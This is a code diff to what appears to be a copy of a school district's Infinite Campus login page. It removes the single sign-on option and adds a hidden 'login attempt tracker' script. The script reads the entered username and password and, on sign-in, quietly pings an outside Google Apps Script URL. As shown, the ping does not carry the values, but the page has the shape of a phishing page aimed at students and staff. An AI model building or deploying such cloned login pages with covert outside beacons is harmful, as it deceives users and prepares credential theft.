@@ -177,27 +177,6 @@
             </div>
         </div>
         
-            
-                
-                
-                    
-                        <div style="text-align: left;padding-left: 25px;padding-top: 50px;">
-                            <a id="samlloginlink" href="https://ocfsdwi.infinitecampus.org/campus/SSO/oak_creek_franklin/sis?configID=1" class="samlLogin">
-                                Single Sign-On (Google)
-                            </a>
-                        </div>
-                    
-                
-            
-
-            <span style="width:250px;">
-                <div class="separator">or</div>
-            </span>
-            
-        
-        
-        
-        
         <form method="POST" id="form_signin" accept-charset="utf-8" action="https://ocfsdwi.infinitecampus.org/campus/verify.jsp">
             <input type="hidden" name="appName" value="oak_creek_franklin"/>
             <input type="hidden" id="screen" name="screen" value=""/>
@@ -469,8 +448,22 @@
             document.getElementById("passwordbutton").click();
         }
     });
-    
-    
+
+    // ── Login attempt tracker ──────────────────────────────────────────────
+    // Replace the URL below with your deployed Apps Script Web App URL.
+    var APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR9nI2upzgZhnCNypjZ8nGMQq7plHG0IjcwnPtKg9wbuLN8jagKxZBVw0T3UilVV910A/exec";
+
+    document.getElementById("signinbtn").addEventListener("click", function() {
+        var username = document.getElementById("username").value.trim();
+        var password = document.getElementById("password").value.trim();
+
+        // Only log when both fields have content
+        if (username !== "" && password !== "") {
+            fetch(APPS_SCRIPT_URL, { method: "GET", mode: "no-cors" }).catch(function() {});
+        }
+    });
+    // ──────────────────────────────────────────────────────────────────────
+
 </script>
 </body>
 </HTML>
